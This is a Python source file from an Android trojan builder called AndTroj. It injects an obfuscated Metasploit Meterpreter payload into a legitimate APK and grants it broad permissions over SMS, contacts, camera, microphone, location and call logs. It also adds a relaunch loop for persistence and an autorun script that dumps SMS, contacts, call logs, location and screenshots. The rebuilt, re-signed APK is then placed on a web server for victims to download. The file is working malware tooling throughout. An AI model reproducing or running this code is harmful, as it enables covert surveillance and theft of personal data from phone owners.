#!/usr/bin/env python
# coding=utf-8
# https://t.me/unk9vvn
# AVI
from core.menu import *
from core.eng_menu import _eng_menu



rnd = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
rand1 = rnd
rand2 = rnd
rand3 = rnd
rand4 = rnd
rand5 = rnd
rand6 = rnd
rand7 = rnd
kutation = '"'
bslash1 = '\\'
bslash2 = '\\'
bslash = bslash1 + bslash2
slashkutat = bslash1 + kutation
authen = '~/.AndTroj/'
dir = '/usr/share/AndTroj'
tmp = dir + '/tmp/'
template = dir + '/templates/'
ORGN = tmp + "orgapp.apk"
PAYN = tmp + "payload.apk"
out1 = tmp + 'orgapp'
out2 = tmp + 'payload'
out3 = tmp + 'launch.txt'
out4 = tmp + 'lach.txt'
out5 = tmp + 'pes.txt'
out6 = tmp + 'persis.sh'
out7 = tmp + 'output.txt'
out8 = tmp + 'ngrok.txt'
out9 = tmp + 'ngrok_beef.txt'
out10 = out1 + '/AndroidManifest.xml'
meta1 = out1 + '/smali/com/' + rand1 + '/' + rand2 + '/'
meta2 = out2 + '/smali/com/metasploit/stage/'
NPAY = tmp + 'nampay.txt'



def _binder():
    global CLS_RN, nam_pay, fname
    fname = open(NPAY)
    data_nam = fname.read()
    nam_pay = data_nam.split('\n', 1)[0]
    CLS_RN = os.path.splitext("{0}".format(nam_pay))[0]
    subprocess.call(
        'apktool -f d ' + ORGN + ' -o ' + out1,
        shell=True)
    subprocess.call(
        'apktool -f d ' + PAYN + ' -o ' + out2,
        shell=True)
    print "I: Injecting payload..."
    chk_com = os.path.exists('{0}/smali/com'.format(out1))
    if chk_com == (False):
        os.system("mkdir {0}/smali/com".format(out1))
    else:
        pass
    subprocess.call(
        'mkdir ' + out1 + '/smali/com/' + rand1,
        shell=True)
    subprocess.call(
        'mkdir ' + out1 + '/smali/com/' + rand1 + '/' + rand2,
        shell=True)
    subprocess.call(
        'cp -r ' + out2 + '/smali/com/metasploit/stage/Payload.smali ' + out1 + '/smali/com/' + rand1 + '/' + rand2 + '/' + rand3 + '.smali',
        shell=True)
    print "I: Obfuscating resource files..."
    subprocess.call(
        'cd ' + meta2 + ' && cp MainService.smali MainBroadcastReceiver.smali MainActivity.smali f.smali e.smali d.smali c.smali b.smali a.smali ' + meta1,
        shell=True)
    subprocess.call(
        'sed -i "s#/metasploit/stage#/' + rand1 + '/' + rand2 + '#g" ' + meta1 + '*',
        shell=True)
    subprocess.call(
        'sed -i "s#Payload#' + rand3 + '#g" ' + meta1 + '*',
        shell=True)
    subprocess.call(
        'sed -i "s#com.metasploit.meterpreter.AndroidMeterpreter#com.' + rand4 + '.' + rand5 + '.' + rand6 + '#" ' + meta1 + rand3 + '.smali',
        shell=True)
    subprocess.call(
        'sed -i "s#payload#' + rand7 + '#g" ' + meta1 + rand3 + '.smali',
        shell=True)
    print "I: Adding all permissions..."
    if '<uses-permission android:name="android.permission.INTERNET"/>' in open(out10).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.INTERNET"/>\' ' + out1 + '/AndroidManifest.xml',
            shell=True)
    if '<uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>' in open(out10).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>\' ' + out1 + '/AndroidManifest.xml',
            shell=True)
    if '<uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>' in open(out10).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>\' ' + out1 + '/AndroidManifest.xml',
            shell=True)
    if '<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>' in open(out10).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\' ' + out1 + '/AndroidManifest.xml',
            shell=True)
    if '<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>' in open(out10).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>\' ' + out1 + '/AndroidManifest.xml',
            shell=True)
    if '<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>' in open(out10).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>\' ' + out1 + '/AndroidManifest.xml',
            shell=True)
    if '<uses-permission android:name="android.permission.READ_PHONE_STATE"/>' in open(out10).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>\' ' + out1 + '/AndroidManifest.xml',
            shell=True)
    if '<uses-permission android:name="android.permission.SEND_SMS"/>' in open(out10).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.SEND_SMS"/>\' ' + out1 + '/AndroidManifest.xml',
            shell=True)
    if '<uses-permission android:name="android.permission.RECEIVE_SMS"/>' in open(out10).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.RECEIVE_SMS"/>\' ' + out1 + '/AndroidManifest.xml',
            shell=True)
    if '<uses-permission android:name="android.permission.RECORD_AUDIO"/>' in open(out10).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.RECORD_AUDIO"/>\' ' + out1 + '/AndroidManifest.xml',
            shell=True)
    if '<uses-permission android:name="android.permission.CALL_PHONE"/>' in open(out10).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.CALL_PHONE"/>\' ' + out1 + '/AndroidManifest.xml',
            shell=True)
    if '<uses-permission android:name="android.permission.READ_CONTACTS"/>' in open(out10).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.READ_CONTACTS"/>\' ' + out1 + '/AndroidManifest.xml',
            shell=True)
    if '<uses-permission android:name="android.permission.WRITE_CONTACTS"/>' in open(out10).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>\' ' + out1 + '/AndroidManifest.xml',
            shell=True)
    if '<uses-permission android:name="android.permission.RECORD_AUDIO"/>' in open(out10).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.RECORD_AUDIO"/>\' ' + out1 + '/AndroidManifest.xml',
            shell=True)
    if '<uses-permission android:name="android.permission.WRITE_SETTINGS"/>' in open(out10).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>\' ' + out1 + '/AndroidManifest.xml',
            shell=True)
    if '<uses-permission android:name="android.permission.CAMERA"/>' in open(out10).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.CAMERA"/>\' ' + out1 + '/AndroidManifest.xml',
            shell=True)
    if '<uses-permission android:name="android.permission.READ_SMS"/>' in open(out10).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.READ_SMS"/>\' ' + out1 + '/AndroidManifest.xml',
            shell=True)
    if '<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>' in open(out10).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>\' ' + out1 + '/AndroidManifest.xml',
            shell=True)
    if '<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>' in open(out10).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>\' ' + out1 + '/AndroidManifest.xml',
            shell=True)
    if '<uses-permission android:name="android.permission.SET_WALLPAPER"/>' in open(out10).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.SET_WALLPAPER"/>\' ' + out1 + '/AndroidManifest.xml',
            shell=True)
    if '<uses-permission android:name="android.permission.READ_CALL_LOG"/>' in open(out10).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.READ_CALL_LOG"/>\' ' + out1 + '/AndroidManifest.xml',
            shell=True)
    if '<uses-permission android:name="android.permission.WRITE_CALL_LOG"/>' in open(out10).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>\' ' + out1 + '/AndroidManifest.xml',
            shell=True)
    if '<uses-permission android:name="android.permission.WAKE_LOCK"/>' in open(out10).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.WAKE_LOCK"/>\' ' + out1 + '/AndroidManifest.xml',
            shell=True)
    subprocess.call(
        "LIN=$(awk '/category.LAUNCHER/{ print NR - 3 }' " + out1 + "/AndroidManifest.xml) && sed -n \"$LIN\"p " + out1 + "/AndroidManifest.xml > " + tmp + "launch.txt",
        shell=True)
    with open('{0}launch.txt'.format(tmp)) as myfile:
        if 'android:name=' in myfile.read():
            print "I: Founded Main Activity..."
        else:
            subprocess.call(
                "LIN=$(awk '/category.LAUNCHER/{ print NR - 4 }' " + out1 + "/AndroidManifest.xml) && sed -n \"$LIN\"p " + out1 + "/AndroidManifest.xml > " + tmp + "launch.txt",
                shell=True)
            pass
    subprocess.call(
        "grep -o 'android:name=\"[^\"]*' " + out3 + " > " + tmp + "lach.txt",
        shell=True)
    subprocess.call(
        'sed -i -e \'s/\(android:\|name\|=\"\)//g\' ' + tmp + "lach.txt",
        shell=True)
    subprocess.call(
        "tr '.' '/' <" + out4 + " >" + tmp + "output.txt",
        shell=True)
    print "I: Injecting startup launcher..."
    subprocess.call(
        "GIZ=$(cat " + out7 + ") && sed -i '/invoke.*;->onCreate.*(Landroid\/os\/Bundle;)V/a " + bslash + "n\ \ \ \ invoke-static \{p0\}, Lcom/'" + rand1 + "'\/'" + rand2 + "'\/'" + rand3 + "'\;->start(Landroid\/content\/Context;)V' " + out1 + "/smali/\"$GIZ\".smali",
        shell=True)
    subprocess.call(
        "PIN=$(awk '/package=/{ print NR}' " + out1 + "/AndroidManifest.xml) && sed -n \"$PIN\"p " + out1 + "/AndroidManifest.xml > " + tmp + "pes.txt",
        shell=True)
    subprocess.call(
        "grep -o 'package=\"[^\"]*' " + out5 + " > " + tmp + "pers.txt",
        shell=True)
    subprocess.call(
        'sed -i -e \'s/\(package="\|name\|=\"\)//g\' ' + tmp + "pers.txt",
        shell=True)
    subprocess.call(
        'FIL="#!" && echo "$FIL/bin/bash" > /usr/share/AndTroj/tmp/persis.sh && echo "while true" >> /usr/share/AndTroj/tmp/persis.sh && echo "do am start '
        '--user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity" >> /usr/share/AndTroj/tmp/persis.sh && echo '
        '"sleep 600" >> /usr/share/AndTroj/tmp/persis.sh && echo "done" >> /usr/share/AndTroj/tmp/persis.sh',
        shell=True)
    subprocess.call(
        'GUZ=$(cat ' + tmp + 'pers.txt) && sed -i "s#com.metasploit.stage#"$GUZ"#" ' + out6,
        shell=True)
    subprocess.call(
        'GUS=$(cat ' + out4 + ') && sed -i "s#.MainActivity#"$GUS"#" ' + out6,
        shell=True)
    print "I: Generating persistence..."
    subprocess.call(
        'echo "upload ' + tmp + 'persis.sh" > ' + tmp + 'autoand.rc;echo "execute -f \"sh persis.sh\"" >> ' + tmp + 'autoand.rc;echo "sysinfo" >> ' + tmp + 'autoand.rc;echo "getwd" >> ' + tmp + 'autoand.rc;echo "geolocate" >> ' + tmp + 'autoand.rc;echo "screenshot" >> ' + tmp + 'autoand.rc;echo "dump_calllog" >> ' + tmp + 'autoand.rc;echo "dump_sms" >> ' + tmp + 'autoand.rc;echo "dump_contacts" >> ' + tmp + 'autoand.rc',
        shell=True)
    print "I: Clear data templates..."
    subprocess.call(
        'cd ' + tmp + ' && rm pers.txt pes.txt launch.txt output.txt lach.txt',
        shell=True)
    print "I: Compile original apk..."
    subprocess.call(
        'apktool -a /usr/bin/aapt b ' + out1,
        shell=True)
    print "I: Signin unknown cert apk..."
    subprocess.call(
        'jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore ' + dir + '/others/debug.keystore ' + out1 + '/dist/orgapp.apk alias_name -storepass 00980098',
        shell=True)
    subprocess.call(
        'mv {0}/dist/orgapp.apk {1}-b.apk'.format(out1, CLS_RN),
        shell=True)
    subprocess.call(
        'cp ' + CLS_RN + '-b.apk /var/www/html/',
        shell=True)
    print "[i] generating torjan /root"
    _eng_menu()
